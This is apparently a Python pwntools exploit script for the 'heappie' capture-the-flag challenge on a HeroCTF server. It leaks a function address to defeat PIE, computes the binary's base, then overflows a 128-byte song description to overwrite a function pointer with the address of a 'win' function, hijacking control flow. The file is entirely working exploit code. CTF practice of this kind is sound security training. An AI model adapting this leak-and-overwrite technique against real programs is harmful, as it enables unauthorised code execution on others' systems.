#!/usr/bin/env python3
from pwn import ELF, remote, p64, context


elf = context.binary = ELF('heappie/heappie', checksec=False)

PLAY_SYMBOLS = {
    b"music 1": elf.sym["play_1"],
    b"music 2": elf.sym["play_2"],
    b"music 3": elf.sym["play_3"]
}

# io = process(elf.path)
io = remote("pwn.heroctf.fr", 6000)

def add_music(title, artist, description, add_music):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b'music? (y/n): ', add_music)
    io.sendlineafter(b'title: ', title)
    io.sendlineafter(b'artist: ', artist)
    io.sendlineafter(b'description: ', description)

def play_music(idx, leak_play_symbol=False):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b'index: ', str(idx).encode())

    if leak_play_symbol:
        data = io.recvline()
        for key, value in PLAY_SYMBOLS.items():
            if key in data:
                return value

def delete_music(idx):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b'index: ', str(idx).encode())

def show_playlist(leak_play_address=False):
    io.sendlineafter(b'>> ', b'4')

    if leak_play_address:
        io.recvuntil(b"(song: ")
        return int(io.recvline().strip()[:-1], 16)

# ----[ EXPLOIT ]-----
# context.log_level = 'debug'
add_music(b"AAAA", b"BBBB", b"CCCC", b"y")
play_addr = show_playlist(leak_play_address=True)
play_sym = play_music(0, leak_play_symbol=True)
elf.address = play_addr - play_sym

print(f"Play address: {hex(play_addr)}")
print(f"Play symbol: {hex(play_sym)}")
print(f"ELF base address: {hex(elf.address)}")
print(f"Win function address: {hex(elf.sym['win'])}")

input("Press Enter to continue...")

description = b"O" * 128 + p64(elf.sym["win"])
add_music(b"MMMM", b"NNNN", description, b"n")
add_music(b"XXXX", b"YYYY", b"ZZZZ", b"n")

play_music(2)
print(io.recvline())
io.close()